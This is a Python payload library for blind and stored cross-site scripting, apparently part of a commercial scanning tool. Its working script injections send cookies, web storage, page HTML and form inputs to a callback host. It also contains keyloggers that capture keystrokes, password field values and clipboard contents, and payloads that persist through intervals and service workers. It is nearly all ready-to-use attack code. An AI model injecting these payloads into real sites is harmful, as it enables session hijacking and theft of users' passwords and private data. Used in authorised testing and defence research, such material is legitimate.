#!/usr/bin/env python3

"""
Blind XSS Payloads

Payloads for detecting blind/stored XSS vulnerabilities.

Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Created: Вс 10 авг 2025 19:35:00 MSK
Telegram: https://t.me/EasyProTech
"""

from typing import List, Optional


class BlindXSSPayloads:
    """Blind XSS payload collection"""
    
    @staticmethod
    def get_callback_based_payloads(callback_url: str = "https://example.com/xss") -> List[str]:
        """Callback-based blind XSS payloads"""
        return [
            # Basic image callbacks
            f'<img src="{callback_url}?xss=1">',
            f'<img src=x onerror="fetch(\'{callback_url}?xss=img_onerror\')">',
            f'<img src=x onerror="new Image().src=\'{callback_url}?xss=img_onerror\'">',
            f'<img src=x onerror="document.createElement(\'img\').src=\'{callback_url}?xss=img_onerror\'">',
            
            # Script callbacks
            f'<script>fetch("{callback_url}?xss=script")</script>',
            f'<script>new Image().src="{callback_url}?xss=script"</script>',
            f'<script>navigator.sendBeacon("{callback_url}?xss=script")</script>',
            f'<script>document.createElement("img").src="{callback_url}?xss=script"</script>',
            
            # XMLHttpRequest callbacks
            f'<script>var xhr=new XMLHttpRequest();xhr.open("GET","{callback_url}?xss=xhr");xhr.send()</script>',
            f'<script>var xhr=new XMLHttpRequest();xhr.open("POST","{callback_url}");xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xhr.send("xss=xhr_post")</script>',
            
            # Fetch API callbacks
            f'<script>fetch("{callback_url}?xss=fetch")</script>',
            f'<script>fetch("{callback_url}",{{method:"POST",body:"xss=fetch_post"}})</script>',
            f'<script>fetch("{callback_url}",{{method:"POST",headers:{{"Content-Type":"application/json"}},body:JSON.stringify({{xss:"fetch_json"}})}}).catch(()=>{{}})</script>',
            
            # WebSocket callbacks
            f'<script>var ws=new WebSocket("ws://{callback_url.replace("https://", "").replace("http://", "")}");ws.onopen=function(){{ws.send("xss=websocket")}}</script>',
            
            # Form submissions
            f'<form action="{callback_url}" method="post"><input name="xss" value="form_submit"><input type="submit" style="display:none"></form><script>document.forms[0].submit()</script>',
            
            # Link prefetch
            f'<link rel="prefetch" href="{callback_url}?xss=prefetch">',
            f'<link rel="dns-prefetch" href="{callback_url}">',
            f'<link rel="preconnect" href="{callback_url}">',
            
            # CSS callbacks
            f'<style>body{{background:url("{callback_url}?xss=css")}}</style>',
            f'<style>@import url("{callback_url}?xss=css_import")</style>',
        ]
    
    @staticmethod
    def get_data_exfiltration_payloads(callback_url: str = "https://example.com/xss") -> List[str]:
        """Data exfiltration blind XSS payloads"""
        return [
            # Cookie exfiltration
            f'<script>fetch("{callback_url}?cookies="+encodeURIComponent(document.cookie))</script>',
            f'<script>new Image().src="{callback_url}?cookies="+btoa(document.cookie)</script>',
            f'<script>navigator.sendBeacon("{callback_url}",JSON.stringify({{cookies:document.cookie}}))</script>',
            
            # Local storage exfiltration
            f'<script>fetch("{callback_url}?localStorage="+encodeURIComponent(JSON.stringify(localStorage)))</script>',
            f'<script>new Image().src="{callback_url}?localStorage="+btoa(JSON.stringify(localStorage))</script>',
            
            # Session storage exfiltration
            f'<script>fetch("{callback_url}?sessionStorage="+encodeURIComponent(JSON.stringify(sessionStorage)))</script>',
            f'<script>new Image().src="{callback_url}?sessionStorage="+btoa(JSON.stringify(sessionStorage))</script>',
            
            # DOM content exfiltration
            f'<script>fetch("{callback_url}?html="+encodeURIComponent(document.documentElement.outerHTML))</script>',
            f'<script>fetch("{callback_url}?body="+encodeURIComponent(document.body.innerHTML))</script>',
            f'<script>fetch("{callback_url}?title="+encodeURIComponent(document.title))</script>',
            
            # User agent and info
            f'<script>fetch("{callback_url}?userAgent="+encodeURIComponent(navigator.userAgent))</script>',
            f'<script>fetch("{callback_url}?url="+encodeURIComponent(location.href))</script>',
            f'<script>fetch("{callback_url}?referrer="+encodeURIComponent(document.referrer))</script>',
            f'<script>fetch("{callback_url}?domain="+encodeURIComponent(document.domain))</script>',
            
            # Form data exfiltration
            f'<script>setTimeout(function(){{var forms=document.forms;for(var i=0;i<forms.length;i++){{var formData=new FormData(forms[i]);var data={{}};for(var pair of formData.entries()){{data[pair[0]]=pair[1]}};fetch("{callback_url}?form="+encodeURIComponent(JSON.stringify(data)))}}}},1000)</script>',
            
            # Input values
            f'<script>setTimeout(function(){{var inputs=document.querySelectorAll("input,textarea,select");var data={{}};for(var i=0;i<inputs.length;i++){{if(inputs[i].name)data[inputs[i].name]=inputs[i].value}};fetch("{callback_url}?inputs="+encodeURIComponent(JSON.stringify(data)))}},1000)</script>',
        ]
    
    @staticmethod
    def get_persistent_payloads(callback_url: str = "https://example.com/xss") -> List[str]:
        """Persistent/stored XSS detection payloads"""
        return [
            # Event-based persistence
            f'<img src=x onerror="setInterval(function(){{fetch(\'{callback_url}?persistent=img_interval&t=\'+Date.now())}},10000)">',
            f'<script>setInterval(function(){{fetch("{callback_url}?persistent=script_interval&t="+Date.now())}},30000)</script>',
            f'<script>window.addEventListener("load",function(){{fetch("{callback_url}?persistent=window_load&t="+Date.now())}})</script>',
            
            # Storage-based persistence  
            f'<script>localStorage.setItem("xss_callback","{callback_url}");setInterval(function(){{fetch(localStorage.getItem("xss_callback")+"?persistent=localStorage&t="+Date.now())}},60000)</script>',
            f'<script>sessionStorage.setItem("xss_callback","{callback_url}");setInterval(function(){{fetch(sessionStorage.getItem("xss_callback")+"?persistent=sessionStorage&t="+Date.now())}},60000)</script>',
            
            # Document ready persistence
            f'<script>document.addEventListener("DOMContentLoaded",function(){{fetch("{callback_url}?persistent=dom_ready&t="+Date.now())}})</script>',
            f'<script>if(document.readyState==="loading"){{document.addEventListener("DOMContentLoaded",function(){{fetch("{callback_url}?persistent=dom_ready2&t="+Date.now())}})}}else{{fetch("{callback_url}?persistent=dom_ready_immediate&t="+Date.now())}}</script>',
            
            # Mutation observer persistence
            f'<script>var observer=new MutationObserver(function(){{fetch("{callback_url}?persistent=mutation&t="+Date.now())}});observer.observe(document.body,{{childList:true,subtree:true}})</script>',
            
            # Service worker persistence
            f'<script>if("serviceWorker" in navigator){{navigator.serviceWorker.register("data:application/javascript,self.addEventListener(\\"message\\",function(e){{fetch(\\"{callback_url}?persistent=sw&t=\\"+Date.now())}})")}}</script>',
        ]
    
    @staticmethod
    def get_timing_based_payloads(callback_url: str = "https://example.com/xss") -> List[str]:
        """Timing-based blind XSS detection payloads"""
        return [
            # Delayed execution
            f'<script>setTimeout(function(){{fetch("{callback_url}?timing=5sec&t="+Date.now())}},5000)</script>',
            f'<script>setTimeout(function(){{fetch("{callback_url}?timing=10sec&t="+Date.now())}},10000)</script>',
            f'<script>setTimeout(function(){{fetch("{callback_url}?timing=30sec&t="+Date.now())}},30000)</script>',
            f'<script>setTimeout(function(){{fetch("{callback_url}?timing=60sec&t="+Date.now())}},60000)</script>',
            
            # Random delays
            f'<script>setTimeout(function(){{fetch("{callback_url}?timing=random&t="+Date.now())}},Math.random()*10000)</script>',
            f'<script>setTimeout(function(){{fetch("{callback_url}?timing=random_long&t="+Date.now())}},Math.random()*60000)</script>',
            
            # Multiple callbacks
            f'<script>for(var i=1;i<=5;i++){{setTimeout(function(x){{return function(){{fetch("{callback_url}?timing=multi&count="+x+"&t="+Date.now())}}}}(i),i*5000)}}</script>',
            
            # Page visibility based
            f'<script>document.addEventListener("visibilitychange",function(){{if(!document.hidden){{fetch("{callback_url}?timing=visible&t="+Date.now())}}}});document.addEventListener("focus",function(){{fetch("{callback_url}?timing=focus&t="+Date.now())}})</script>',
            
            # Scroll-based timing
            f'<script>window.addEventListener("scroll",function(){{clearTimeout(window.scrollTimer);window.scrollTimer=setTimeout(function(){{fetch("{callback_url}?timing=scroll&t="+Date.now())}},1000)}})</script>',
        ]
    
    @staticmethod
    def get_environment_detection_payloads(callback_url: str = "https://example.com/xss") -> List[str]:
        """Environment detection blind XSS payloads"""
        return [
            # Browser detection
            f'<script>fetch("{callback_url}?browser="+encodeURIComponent(navigator.userAgent+"||"+navigator.vendor+"||"+window.opera))</script>',
            f'<script>var info="Chrome:"+(!!window.chrome)+" Firefox:"+(navigator.userAgent.indexOf("Firefox")>-1)+" Safari:"+(navigator.userAgent.indexOf("Safari")>-1&&navigator.userAgent.indexOf("Chrome")==-1)+" Edge:"+(navigator.userAgent.indexOf("Edge")>-1);fetch("{callback_url}?detection="+encodeURIComponent(info))</script>',
            
            # Platform detection
            f'<script>fetch("{callback_url}?platform="+encodeURIComponent(navigator.platform+"||"+navigator.oscpu))</script>',
            f'<script>var mobile=/Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);fetch("{callback_url}?mobile="+mobile)</script>',
            
            # Admin panel detection
            f'<script>var isAdmin=location.href.indexOf("admin")>-1||location.href.indexOf("dashboard")>-1||document.title.indexOf("Admin")>-1;fetch("{callback_url}?admin="+isAdmin)</script>',
            f'<script>var adminElements=document.querySelectorAll("[href*=admin],[href*=dashboard],[class*=admin],[id*=admin]").length;fetch("{callback_url}?adminElements="+adminElements)</script>',
            
            # Framework detection
            f'<script>var frameworks="jQuery:"+(!!window.jQuery)+" Angular:"+(!!window.angular)+" React:"+(!!window.React)+" Vue:"+(!!window.Vue);fetch("{callback_url}?frameworks="+encodeURIComponent(frameworks))</script>',
            f'<script>var libs="Bootstrap:"+(!!window.bootstrap||!!$().modal)+" Moment:"+(!!window.moment)+" Lodash:"+(!!window._);fetch("{callback_url}?libs="+encodeURIComponent(libs))</script>',
            
            # Security headers detection
            f'<script>var csp=document.querySelector("meta[http-equiv*=Content-Security-Policy]");fetch("{callback_url}?csp="+(csp?encodeURIComponent(csp.content):"none"))</script>',
            f'<script>var xframe=document.querySelector("meta[http-equiv*=X-Frame-Options]");fetch("{callback_url}?xframe="+(xframe?encodeURIComponent(xframe.content):"none"))</script>',
        ]
    
    @staticmethod
    def get_keylogger_payloads(callback_url: str = "https://example.com/xss") -> List[str]:
        """Keylogger blind XSS payloads"""
        return [
            # Basic keylogger
            f'<script>var keys="";document.addEventListener("keypress",function(e){{keys+=String.fromCharCode(e.which);if(keys.length>50){{fetch("{callback_url}?keys="+encodeURIComponent(keys));keys=""}}}});setInterval(function(){{if(keys.length>0){{fetch("{callback_url}?keys="+encodeURIComponent(keys));keys=""}}}},10000)</script>',
            
            # Form-focused keylogger
            f'<script>document.addEventListener("focusin",function(e){{if(e.target.tagName==="INPUT"||e.target.tagName==="TEXTAREA"){{var keys="";var target=e.target;target.addEventListener("keypress",function(ke){{keys+=String.fromCharCode(ke.which)}});target.addEventListener("blur",function(){{if(keys.length>0){{fetch("{callback_url}?formkeys="+encodeURIComponent(target.name+"="+keys))}}}})}}}})</script>',
            
            # Password field logger
            f'<script>setInterval(function(){{var passFields=document.querySelectorAll("input[type=password]");for(var i=0;i<passFields.length;i++){{if(passFields[i].value.length>0){{fetch("{callback_url}?password="+encodeURIComponent(passFields[i].value));passFields[i].value=""}}}}}},5000)</script>',
            
            # Clipboard logger
            f'<script>document.addEventListener("paste",function(e){{setTimeout(function(){{var clipboardData=e.clipboardData||window.clipboardData;var pastedData=clipboardData.getData("Text");if(pastedData.length>0){{fetch("{callback_url}?clipboard="+encodeURIComponent(pastedData))}}}},100)}});navigator.clipboard&&navigator.clipboard.readText&&setInterval(function(){{navigator.clipboard.readText().then(function(text){{if(text.length>0){{fetch("{callback_url}?clipboard2="+encodeURIComponent(text))}}}}).catch(function(){{}})}},30000)</script>',
        ]
    
    @staticmethod
    def get_all(callback_url: str = "https://example.com/xss") -> List[str]:
        """Get all blind XSS payloads"""
        payloads = []
        payloads.extend(BlindXSSPayloads.get_callback_based_payloads(callback_url))
        payloads.extend(BlindXSSPayloads.get_data_exfiltration_payloads(callback_url))
        payloads.extend(BlindXSSPayloads.get_persistent_payloads(callback_url))
        payloads.extend(BlindXSSPayloads.get_timing_based_payloads(callback_url))
        payloads.extend(BlindXSSPayloads.get_environment_detection_payloads(callback_url))
        payloads.extend(BlindXSSPayloads.get_keylogger_payloads(callback_url))
        return payloads